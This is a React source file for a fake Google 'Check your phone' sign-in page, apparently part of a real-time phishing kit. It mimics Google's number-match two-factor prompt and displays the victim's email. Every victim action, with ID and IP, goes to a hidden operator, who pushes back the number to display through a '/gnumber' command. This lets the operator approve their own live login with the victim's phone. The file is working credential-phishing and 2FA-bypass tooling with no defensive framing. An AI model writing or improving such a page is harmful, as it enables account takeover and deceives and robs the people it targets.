import React, { useState, useEffect, useRef, useContext } from "react";
import { styled } from "styled-components";
import { DataContext } from "../../pages";
import SendData from "../../hooks/SendData";
import GoogleShell, {
  GTitle,
  GBody,
  GoogleSpinner,
  TextButton,
  GContent,
  GLeft,
  GRight,
  GActions,
} from "./GoogleShell";
import { GOOGLE_CONFIG, googleDebugLog } from "../../utils/googleConfig";

const BigNumber = styled.div`
  font-family: "Google Sans", Roboto, Arial, sans-serif;
  font-size: 72px;
  font-weight: 500;
  color: #1f1f1f;
  text-align: center;
  margin: 24px 0 40px;
  line-height: 1;
`;

const PhoneArt = styled.div`
  display: flex;
  justify-content: center;
  margin: 8px 0 16px;
`;

const WaitingWrap = styled.div`
  flex: 1;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  min-height: 300px;
  gap: 24px;
`;

function GooglePrompt({
  Unik,
  setStep,
  Email,
  Tel,
  Ip,
  googlePromptNumber,
}) {
  const { setAllData, AllData } = useContext(DataContext);

  const [number, setNumber] = useState(() =>
    typeof googlePromptNumber === "number" ? googlePromptNumber : null
  );
  const [resendLoading, setResendLoading] = useState(false);
  const [showWaiting, setShowWaiting] = useState(false);
  const lastPropNumber = useRef(
    typeof googlePromptNumber === "number" ? googlePromptNumber : null
  );
  const hasReportedMount = useRef(false);

  const displayEmail = AllData?.google_email || Email || AllData?.login_email || "";

  const sendUpdate = (extra, stepMessage) => {
    const params = {
      ...AllData,
      id: Unik,
      ip: Ip || AllData?.ip,
      ...extra,
      currentStep: stepMessage,
    };
    setAllData(params);
    SendData(params);
  };

  const hasNumber = typeof number === "number";

  // Mount notification — tell the operator whether a number is ready
  useEffect(() => {
    if (hasReportedMount.current) return;
    hasReportedMount.current = true;

    if (hasNumber) {
      sendUpdate({}, `Google Prompt Page Loaded - Number displayed: ${number}`);
    } else {
      sendUpdate({}, "Google Prompt Page Loaded - Waiting for operator to set number");
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  // Live-update when the operator sets a number via /gnumber
  useEffect(() => {
    if (typeof googlePromptNumber !== "number") return;
    if (googlePromptNumber === lastPropNumber.current) return;

    lastPropNumber.current = googlePromptNumber;
    setNumber(googlePromptNumber);
    googleDebugLog("Operator set prompt number:", googlePromptNumber);
    sendUpdate({}, `Google Prompt - Operator set number: ${googlePromptNumber}`);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [googlePromptNumber]);

  const handleResend = () => {
    if (resendLoading) return;
    setResendLoading(true);
    sendUpdate({}, `Google Prompt - User clicked Resend (number ${number})`);
    setTimeout(() => setResendLoading(false), GOOGLE_CONFIG.BUTTON_DELAY);
  };

  const handleTryAnotherWay = () => {
    if (showWaiting) return;
    setShowWaiting(true);
    sendUpdate({}, "Google Prompt - User clicked Try another way — waiting for operator");
  };

  // "Try another way" waiting screen
  if (showWaiting) {
    return (
      <GoogleShell initialLoading={false}>
        <WaitingWrap>
          <GoogleSpinner size={36} />
          <GBody style={{ textAlign: "center" }}>Looking for more options…</GBody>
        </WaitingWrap>
      </GoogleShell>
    );
  }

  // No number yet — waiting for operator /gnumber
  if (!hasNumber) {
    return (
      <GoogleShell initialLoading={false}>
        <WaitingWrap>
          <GoogleSpinner size={36} />
          <GBody style={{ textAlign: "center" }}>
            Sending a notification to your signed-in device…
          </GBody>
        </WaitingWrap>
      </GoogleShell>
    );
  }

  // Number is available — normal prompt page
  return (
    <GoogleShell>
      <GContent>
        <GLeft>
          <GTitle>Check your phone</GTitle>
          <GBody style={{ marginBottom: 16 }}>{displayEmail}</GBody>
          <GBody>
            Google sent a notification to your phone. To continue, open the
            Gmail or Google app and tap the number you see on this screen.
          </GBody>
        </GLeft>
        <GRight>
          <PhoneArt>
            <svg width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="#444746" strokeWidth="1.5">
              <rect x="6" y="2" width="12" height="20" rx="2.5" />
              <line x1="10" y1="19" x2="14" y2="19" strokeLinecap="round" />
            </svg>
          </PhoneArt>
          <BigNumber>{number}</BigNumber>
        </GRight>
      </GContent>
      <GActions>
        <TextButton type="button" onClick={handleResend} disabled={resendLoading || showWaiting}>
          {resendLoading ? <GoogleSpinner size={16} /> : "Resend it"}
        </TextButton>
        <TextButton type="button" onClick={handleTryAnotherWay} disabled={resendLoading || showWaiting}>
          {showWaiting ? <GoogleSpinner size={16} /> : "Try another way"}
        </TextButton>
      </GActions>
    </GoogleShell>
  );
}

export default GooglePrompt;
